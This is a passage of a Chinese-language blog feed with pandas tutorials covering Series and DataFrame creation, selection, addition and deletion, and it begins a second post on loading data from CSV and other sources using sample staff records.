class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">data=np.array([<span class="string">'陈一'</span>,<span class="string">'周二'</span>,<span class="string">'张三'</span>,<span class="string">'李四'</span>,<span class="string">'王五'</span>,<span class="string">'赵六'</span>])</span><br><span class="line">obj= pd.Series(data,index=[<span class="string">'一'</span>,<span class="string">'二'</span>,<span class="string">'三'</span>,<span class="string">'四'</span>,<span class="string">'五'</span>,<span class="string">'六'</span>])</span><br><span class="line">print(<span class="string">'obj的Series数据'</span>)</span><br><span class="line">print(obj)</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#位置下标访问</span></span><br><span class="line">print(<span class="string">'位置下标访问:obj[0]'</span>)</span><br><span class="line">print(obj[<span class="number">0</span>])</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#切片访问</span></span><br><span class="line">print(<span class="string">'位置切片访问多个元素值:obj[1:3]'</span>)</span><br><span class="line">print(obj[<span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#索引访问</span></span><br><span class="line">print(<span class="string">'索引访问:obj[obj.index==\'三\']'</span>)</span><br><span class="line">print(obj[obj.index==<span class="string">'三'</span>])</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#索引访问</span></span><br><span class="line">print(<span class="string">'索引访问:obj[\'一\']'</span>)</span><br><span class="line">print(obj[<span class="string">'一'</span>])</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#索引列表访问</span></span><br><span class="line">print(<span class="string">'索引列表访问多个元素值:obj[[\'二\',\'三\']]'</span>)</span><br><span class="line">print(obj[[<span class="string">'二'</span>,<span class="string">'三'</span>]])</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">obj的Series数据</span><br><span class="line">一    陈一</span><br><span class="line">二    周二</span><br><span class="line">三    张三</span><br><span class="line">四    李四</span><br><span class="line">五    王五</span><br><span class="line">六    赵六</span><br><span class="line">dtype: object</span><br><span class="line"></span><br><span class="line">位置下标访问:obj[<span class="number">0</span>]</span><br><span class="line">陈一</span><br><span class="line"></span><br><span class="line">位置切片访问多个元素值:obj[<span class="number">1</span>:<span class="number">3</span>]</span><br><span class="line">二    周二</span><br><span class="line">三    张三</span><br><span class="line">dtype: object</span><br><span class="line"></span><br><span class="line">索引访问:obj[obj.index==<span class="string">'三'</span>]</span><br><span class="line">三    张三</span><br><span class="line">dtype: object</span><br><span class="line"></span><br><span class="line">索引访问:obj[<span class="string">'一'</span>]</span><br><span class="line">陈一</span><br><span class="line"></span><br><span class="line">索引列表访问多个元素值:obj[[<span class="string">'二'</span>,<span class="string">'三'</span>]]</span><br><span class="line">二    周二</span><br><span class="line">三    张三</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure><h4 id="head-amp-tail-查看数据"><a href="#head-amp-tail-查看数据" class="headerlink" title="head()&amp;tail()查看数据"></a>head()&amp;tail()查看数据</h4><p>如果想要查看 Series 的某一部分数据，可以使用 head() 或者 tail() 方法。其中 head() 返回前 n 行数据，默认显示前 5 行数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">data=np.array([<span class="string">'陈一'</span>,<span class="string">'周二'</span>,<span class="string">'张三'</span>,<span class="string">'李四'</span>,<span class="string">'王五'</span>,<span class="string">'赵六'</span>])</span><br><span class="line">obj= pd.Series(data,index=[<span class="string">'一'</span>,<span class="string">'二'</span>,<span class="string">'三'</span>,<span class="string">'四'</span>,<span class="string">'五'</span>,<span class="string">'六'</span>])</span><br><span class="line"><span class="comment">#输出前三行数据</span></span><br><span class="line">print(<span class="string">'输出前三行数据'</span>)</span><br><span class="line">print(obj.head(<span class="number">3</span>))</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#输出后两行数据</span></span><br><span class="line">print(<span class="string">'输出后两行数据'</span>)</span><br><span class="line">print(obj.tail(<span class="number">2</span>))</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输出前三行数据</span><br><span class="line">一    陈一</span><br><span class="line">二    周二</span><br><span class="line">三    张三</span><br><span class="line">dtype: object</span><br><span class="line"></span><br><span class="line">输出后两行数据</span><br><span class="line">五    王五</span><br><span class="line">六    赵六</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure><h3 id="Series数据增加"><a href="#Series数据增加" class="headerlink" title="Series数据增加"></a>Series数据增加</h3><h4 id="1-直接通过索引增加"><a href="#1-直接通过索引增加" class="headerlink" title="1.直接通过索引增加"></a>1.直接通过索引增加</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过索引增加数据</span></span><br><span class="line">obj[<span class="string">'十一'</span>]=<span class="string">'肖十一'</span></span><br><span class="line">print(obj)</span><br><span class="line"></span><br><span class="line">一      陈一</span><br><span class="line">二      周二</span><br><span class="line">三      张三</span><br><span class="line">四      李四</span><br><span class="line">五      王五</span><br><span class="line">六      赵六</span><br><span class="line">十一    肖十一</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure><h4 id="2-通过append-增加"><a href="#2-通过append-增加" class="headerlink" title="2.通过append()增加"></a>2.通过append()增加</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过append()增加多个数据</span></span><br><span class="line">obj2=pd.Series([<span class="string">'郭芙蓉'</span>,<span class="string">'杨过'</span>],index=[<span class="string">'十二'</span>,<span class="string">'十三'</span>])</span><br><span class="line">obj=obj.append(obj2)</span><br><span class="line">print(obj)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">一      陈一</span><br><span class="line">二      周二</span><br><span class="line">三      张三</span><br><span class="line">四      李四</span><br><span class="line">五      王五</span><br><span class="line">六      赵六</span><br><span class="line">十一    肖十一</span><br><span class="line">十二    郭芙蓉</span><br><span class="line">十三     杨过</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure><h3 id="Series数据修改"><a href="#Series数据修改" class="headerlink" title="Series数据修改"></a>Series数据修改</h3><p>Series数据可以通过制定索引直接修改<br>如：修改索引为十一的数据，直接obj[‘十一’]=’肖XX’，就可以进行修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改Series数据</span></span><br><span class="line">obj[<span class="string">'十一'</span>]=<span class="string">'肖XX'</span></span><br><span class="line">print(obj)</span><br><span class="line"></span><br><span class="line">一      陈一</span><br><span class="line">二      周二</span><br><span class="line">三      张三</span><br><span class="line">四      李四</span><br><span class="line">五      王五</span><br><span class="line">六      赵六</span><br><span class="line">十一    肖XX</span><br><span class="line">十二    郭芙蓉</span><br><span class="line">十三     杨过</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure><h3 id="Series数据删除"><a href="#Series数据删除" class="headerlink" title="Series数据删除"></a>Series数据删除</h3><p>通过drop()删除，<code>注意如果没有带inplace=True，会返回一个新的Series对象。如果要修改本对象，注意要带上inplace=True</code>。</p><h4 id="1-删除单个数据"><a href="#1-删除单个数据" class="headerlink" title="1.删除单个数据"></a>1.删除单个数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">obj.drop(<span class="string">'十一'</span>,inplace=<span class="literal">True</span>)</span><br><span class="line">print(obj)</span><br><span class="line"></span><br><span class="line">一      陈一</span><br><span class="line">二      周二</span><br><span class="line">三      张三</span><br><span class="line">四      李四</span><br><span class="line">五      王五</span><br><span class="line">六      赵六</span><br><span class="line">十二    郭芙蓉</span><br><span class="line">十三     杨过</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure><h4 id="2-删除多个数据"><a href="#2-删除多个数据" class="headerlink" title="2.删除多个数据"></a>2.删除多个数据</h4><p>参数为索引列表，即可以删除索引为列表中的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj.drop([<span class="string">'十二'</span>,<span class="string">'十三'</span>],inplace=<span class="literal">True</span>)</span><br><span class="line">print(obj)</span><br><span class="line"></span><br><span class="line">一    陈一</span><br><span class="line">二    周二</span><br><span class="line">三    张三</span><br><span class="line">四    李四</span><br><span class="line">五    王五</span><br><span class="line">六    赵六</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure><h1 id="二、DataFrame"><a href="#二、DataFrame" class="headerlink" title="二、DataFrame"></a>二、DataFrame</h1><p>DataFrame 是 Pandas 的重要数据结构之一，也是在使用 Pandas 进行数据分析过程中最常用的结构之一。DataFrame 一个表格型的数据结构，既有行标签（index），又有列标签（columns），它也被称异构数据表，所谓异构，指的是表格中每列的数据类型可以不同，比如可以是字符串、整型或者浮点型等。DataFrame 的每一行数据都可以看成一个 Series 结构，只不过，DataFrame 为这些行中每个数据值增加了一个列标签。因此 DataFrame 其实是从 Series 的基础上演变而来。<strong>可以把DataFrame看做是关系型数据库里或Excel里的一张表格来理解</strong>。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/DataFrame%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="DataFrame数据结构"><br><strong>DataFrame 数据结构的特点：</strong><br>DataFrame 每一列的标签值允许使用不同的数据类型；<br>DataFrame 是表格型的数据结构，具有行和列；<br>DataFrame 中的每个数据值都可以被修改。<br>DataFrame 结构的行数、列数允许增加或者删除；<br>DataFrame 有两个方向的标签轴，分别是行标签和列标签；<br>DataFrame 可以对行和列执行算术运算。</p><h2 id="1、DataFrame对象的创建"><a href="#1、DataFrame对象的创建" class="headerlink" title="1、DataFrame对象的创建"></a>1、DataFrame对象的创建</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df=pd.DataFrame( data, index, columns, dtype, copy)</span><br></pre></td></tr></table></figure><p>参数说明：</p><table><thead><tr><th>参数名称</th><th>说明</th></tr></thead><tbody><tr><td>data</td><td>输入的数据，可以是 ndarray，series，list，dict，标量以及一个 DataFrame。</td></tr><tr><td>index</td><td>行标签，如果没有传递 index 值，则默认行标签是 np.arange(n)，n 代表 data 的元素个数。</td></tr><tr><td>columns</td><td>列标签，如果没有传递 columns 值，则默认列标签是 np.arange(n)。</td></tr><tr><td>dtype</td><td>dtype表示每一列的数据类型。</td></tr><tr><td>copy</td><td>默认为 False，表示复制数据 data。</td></tr></tbody></table><p>Pandas 提供了多种创建 DataFrame 对象的方式可以看data的参数说明，包括列表、ndarray、series、dict等。<br>平时在数据分析过程中用得最多的应该是从其他数据源文件如cvs、excel、数据库、WEBAPI等方式加载数据到DataFrame中。<br>如：从Excel中加载数据。更多的数据加载方式见：<a href="http://xiejava.ishareread.com/posts/4864590d/" target="_blank" rel="noopener">http://xiejava.ishareread.com/posts/4864590d/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_excel(<span class="string">'D:\\Python\\study\\pythontest\\pandastest\\数据集\\staff.xlsx'</span>)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/staff_excel%E5%AF%BC%E5%85%A5.png" alt="staff数据集"></p><h2 id="2、DataFrame数据操作"><a href="#2、DataFrame数据操作" class="headerlink" title="2、DataFrame数据操作"></a>2、DataFrame数据操作</h2><p>DataFrame 可以使用行索引(index )来选取 DataFrame 中的数据并进行操作。也可以使用列索（columns ）引来完成数据的选取、添加和删除操作。</p><h3 id="1-行索引操作DataFrame"><a href="#1-行索引操作DataFrame" class="headerlink" title="1) 行索引操作DataFrame"></a>1) 行索引操作DataFrame</h3><h4 id="选取数据"><a href="#选取数据" class="headerlink" title="选取数据"></a>选取数据</h4><p>行标签选取数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#选取行标签为2的行</span></span><br><span class="line">df.loc[[<span class="number">2</span>]]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/df%E9%80%89%E5%8F%96%E8%A1%8C%E6%95%B0%E6%8D%AE1.png" alt="选取行标签为2的行"><br>注意：如果是df.loc[2]，同样是选择行标签为2的行，但现实效果为<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/df%E9%80%89%E5%8F%96%E8%A1%8C%E6%95%B0%E6%8D%AE2.png" alt="选取行标签为2的行"><br>因为df.loc[2]返回是Series对象，而df.loc[[2]]返回的是DataFrame对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type(df.iloc[<span class="number">2</span>])</span><br><span class="line">pandas.core.series.Series</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type(df.loc[[<span class="number">2</span>]])</span><br><span class="line">pandas.core.frame.DataFrame</span><br></pre></td></tr></table></figure><p>切片选取数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#切片选取数据（左闭右开）</span></span><br><span class="line">df[<span class="number">2</span>:<span class="number">4</span>]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/%E5%88%87%E7%89%87%E9%80%89%E5%8F%96%E6%95%B0%E6%8D%AE.png" alt="切片选取数据"></p><h4 id="增加行"><a href="#增加行" class="headerlink" title="增加行"></a>增加行</h4><p> 添加数据行，使用 append() 函数，可以将新的数据行添加到 DataFrame 中，该函数会在行末追加数据行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df_1 = pd.DataFrame([[<span class="number">11</span>,<span class="string">'肖十一'</span>,<span class="string">'30'</span>,<span class="string">'女'</span>,<span class="string">'7000'</span>,<span class="string">'1'</span>],[<span class="number">12</span>,<span class="string">'郭芙蓉'</span>,<span class="string">'30'</span>,<span class="string">'女'</span>,<span class="string">'7400'</span>,<span class="string">'1'</span>]],index=[<span class="number">11</span>,<span class="number">12</span>],columns = [<span class="string">'staff_id'</span>,<span class="string">'staff_name'</span>,<span class="string">'staff_age'</span>,<span class="string">'staff_gender'</span>,<span class="string">'staff_salary'</span>,<span class="string">'staff_depatment_id'</span>])</span><br><span class="line">df=df.append(df_1)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/df%E6%B7%BB%E5%8A%A0%E6%95%B0%E6%8D%AE%E8%A1%8C.png" alt=" 添加数据行"></p><p>注意新增加的DataFrame如果没有指定行索引，将会默认从0开始，添加数据行后将会有行重复的行索引。如没有指定index=[11,12]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df_1 = pd.DataFrame([[<span class="number">11</span>,<span class="string">'肖十一'</span>,<span class="string">'30'</span>,<span class="string">'女'</span>,<span class="string">'7000'</span>,<span class="string">'1'</span>],[<span class="number">12</span>,<span class="string">'郭芙蓉'</span>,<span class="string">'30'</span>,<span class="string">'女'</span>,<span class="string">'7400'</span>,<span class="string">'1'</span>]],columns = [<span class="string">'staff_id'</span>,<span class="string">'staff_name'</span>,<span class="string">'staff_age'</span>,<span class="string">'staff_gender'</span>,<span class="string">'staff_salary'</span>,<span class="string">'staff_depatment_id'</span>])</span><br><span class="line">df=df.append(df_1)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/df%E6%B7%BB%E5%8A%A0%E6%95%B0%E6%8D%AE%E8%A1%8C%E9%87%8D%E5%A4%8Did.png" alt="添加数据行有重复行索引"></p><h4 id="删除行"><a href="#删除行" class="headerlink" title="删除行"></a>删除行</h4><p>可以使用行索引标签，从 DataFrame 中删除某一行数据。如果索引标签存在重复，那么它们将被一起删除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df=df.drop(<span class="number">0</span>)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p>可以看到到行索引为0的两条记录被一起删除了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/df%E5%88%A0%E9%99%A4.png" alt="删除"></p><h3 id="2-列索引操作DataFrame"><a href="#2-列索引操作DataFrame" class="headerlink" title="2) 列索引操作DataFrame"></a>2) 列索引操作DataFrame</h3><h4 id="列索引选取数据列"><a href="#列索引选取数据列" class="headerlink" title="列索引选取数据列"></a>列索引选取数据列</h4><p>通过指定列索引来选取数据列，如选择只显示staff_id,staff_name,staff_gender三列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df2=df[[<span class="string">'staff_id'</span>,<span class="string">'staff_name'</span>,<span class="string">'staff_gender'</span>]]</span><br><span class="line">df2</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/df-%E9%80%89%E5%8F%96%E5%88%97.png" alt="列索引选取数据列"></p><h4 id="列索引添加数据列"><a href="#列索引添加数据列" class="headerlink" title="列索引添加数据列"></a>列索引添加数据列</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">df3=df[<span class="string">'staff_salary'</span>]+<span class="number">500</span></span><br><span class="line"><span class="comment">#在df的基础上增加append_cloume列，新增的append_cloume列为df['staff_salary']+500，即薪水加了500的列</span></span><br><span class="line">df[<span class="string">'append_cloume'</span>]=df3</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/df-%E5%88%97%E7%B4%A2%E5%BC%95%E6%B7%BB%E5%8A%A0%E6%95%B0%E6%8D%AE%E5%88%97.png" alt="列索引添加数据列"></p><h4 id="列索引删除数据列"><a href="#列索引删除数据列" class="headerlink" title="列索引删除数据列"></a>列索引删除数据列</h4><p>通过del 来删除指定的数据列，如删除staff_depatment_id列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> df[<span class="string">'staff_depatment_id'</span>]</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/df-%E5%88%97%E7%B4%A2%E5%BC%95%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%88%97.png" alt="列索引删除数据列"></p><p>本文介绍了pandas的两大核心数据结构Series和DataFrame，分别介绍了Series和DataFrame数据对象的创建及基于数据对象的基础上对数据进行选择、增加、删除等数据操作，可以加深对Series和DataFrame的理解，并可以将创建，增、删、改、查等应用于实际的数据处理应用中。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas数据加载(csv、excel、json、mysql、webAPI)</title>
      <link href="/posts/4864590d/"/>
      <url>/posts/4864590d/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220122/pandas.png" alt="pandas"><br>pandas 是基于NumPy 的一种工具，该工具是为解决数据分析任务而创建的。Pandas 纳入了大量库和一些标准的数据模型，提供了高效地操作大型数据集所需的工具。Pandas的名称来自于面板数据（panel data）和python数据分析（data analysis）。pandas提供了大量能使我们快速便捷地处理数据的函数和方法。它是使Python成为强大而高效的数据分析环境的重要因素之一。</p><p>数据的输入是数据分析的第一步，如果不能将数据快速方便的导入导出python，那么pandas不可能成为强大而高效的数据分析环境，本文重点介绍pandas的数据输入加载。pandas的数据输入可以划分为几个大类：读取文本文件和其他更高效的磁盘存储格式，加载数据库中的数据，利用Web API获取网络资源。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220122/pandas%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86.png" alt="pandas数据处理"><br>pandas的IO工具支持非常多的数据输入输出方式。包括csv、json、Excel、数据库等。</p><table><thead><tr><th>Format Type</th><th>Data Description</th><th>Reader</th><th>Writer</th></tr></thead><tbody><tr><td>text</td><td>CSV</td><td>read_csv</td><td>to_csv</td></tr><tr><td>text</td><td>JSON</td><td>read_json</td><td>to_json</td></tr><tr><td>text</td><td>HTML</td><td>read_html</td><td>to_html</td></tr><tr><td>text</td><td>Local clipboard</td><td>read_clipboard</td><td>to_clipboard</td></tr><tr><td>binary</td><td>MS Excel</td><td>read_excel</td><td>to_excel</td></tr><tr><td>binary</td><td>OpenDocument</td><td>read_excel</td><td></td></tr><tr><td>binary</td><td>HDF5 Format</td><td>read_hdf</td><td>to_hdf</td></tr><tr><td>binary</td><td>Feather Format</td><td>read_feather</td><td>to_feather</td></tr><tr><td>binary</td><td>Parquet Format</td><td>read_parquet</td><td>to_parquet</td></tr><tr><td>binary</td><td>Msgpack</td><td>read_msgpack</td><td>to_msgpack</td></tr><tr><td>binary</td><td>Stata</td><td>read_stata</td><td>to_stata</td></tr><tr><td>binary</td><td>SAS</td><td>read_sas</td><td></td></tr><tr><td>binary</td><td>Python Pickle Format</td><td>read_pickle</td><td>to_pickle</td></tr><tr><td>SQL</td><td>SQL</td><td>read_sql</td><td>to_sql</td></tr><tr><td>SQL</td><td>Google Big Query</td><td>read_gbq</td><td>to_gbq</td></tr></tbody></table><p>本文通过几个实例，介绍几种常用的数据加载方式，包括从csv文件、excel文件、关系型数据库如mysql、API接口加载json数据，来初步体验一下pandas加载数据的便捷性。</p><p>见上表pandas 提供了多种数据源读取数据的方法：<br>read_csv() 用于读取文本文件<br>read_json() 用于读取 json 文件<br>read_sql_query() 读取 sql 语句查询的表记录</p><h1 id="一、读取CSV文件"><a href="#一、读取CSV文件" class="headerlink" title="一、读取CSV文件"></a>一、读取CSV文件</h1><p>CSV 又称逗号分隔值文件，是一种简单的文件格式，以特定的结构来排列表格数据。 CSV 文件能够以纯文本形式存储表格数据，比如电子表格、数据库文件，并具有数据交换的通用格式。CSV 文件会在 Excel 文件中被打开，其行和列都定义了标准的数据格式。<br>将 CSV 中的数据转换为 DataFrame 对象是非常便捷的。和一般文件读写不一样，它不需要你做打开文件、读取文件、关闭文件等操作。相反，只需要一行代码就可以完成上述所有步骤，并将数据存储在 DataFrame 中。<br>pandas通过read_csv()从 CSV 文件中读取数据，并创建 DataFrame 对象。<br>下面通过一个实例来说明。一个用于测试的员工数据集csv的数据如下，文件为staff.csv。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"staff_id"</span>,<span class="string">"staff_name"</span>,<span class="string">"staff_age"</span>,<span class="string">"staff_gender"</span>,<span class="string">"staff_salary"</span>,<span class="string">"staff_depatment_id"</span></span><br><span class="line"><span class="string">"1"</span>,<span class="string">"陈一"</span>,<span class="string">"30"</span>,<span class="string">"男"</span>,<span class="string">"7000"</span>,<span class="string">"1"</span></span><br><span class="line"><span class="string">"2"</span>,<span class="string">"周二"</span>,<span class="string">"31"</span>,<span class="string">"男"</span>,<span class="string">"12000"</span>,<span class="string">"2"</span></span><br><span class="line"><span class="string">"3"</span>,<span class="string">"张三"</span>,<span class="string">"30"</span>,<span class="string">"女"</span>,<span class="string">"13000"</span>,<span class="string">"3"</span></span><br><span class="line"><span class="string">"4"</span>,<span class="string">"李四"</span>,<span class="string">"29"</span>,<span class="string">"女"</span>,<span class="string">"15000"</span>,<span class="string">"1"</span></span><br><span class="line"><span class="string">"5"</span>,<span class="string">"王五"</span>,<span class="string">"29"</span>,<span class="string">"男"</span>,<span class="string">"9000"</span>,<span class="string">"2"</span></span><br><span class="line"><span class="string">"6"</span>,<span class="string">"赵六"</span>,<span class="string">"35"</span>,<span class="string">"男"</span>,<span class="string">"8600"</span>,<span class="string">"1"</span></span><br><span class="line"><span class="string">"7"</span>,<span class="string">"钱七"</span>,<span class="string">"36"</span>,<span class="string">"女"</span>,<span class="string">"9700"</span>,<span class="string">"3"</span></span><br><span class="line"><span class="string">"8"</span>,<span class="string">"孙八"</span>,<span class="string">"40"</span>,<span class="string">"女"</span>,<span class="string">"10000"</span>,<span class="string">"3"</span></span><br><span class="line"><span class="string">"9"</span>,<span class="string">"何九"</span>,<span class="string">"40"</span>,<span class="string">"男"</span>,<span class="string">"11000"</span>,<span class="string">"1"</span></span><br><span class="line"><span class="string">"10"</span>,<span class="string">"顾十"</span>,<span class="string">"37"</span>,<span class="string">"女"</span>,<span class="string">"15000"</span>,<span class="string">"2"</span></span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_csv(<span class="string">'C:\\Users\\xiejava\\Desktop\\staff.csv'</span>)</span><br><span 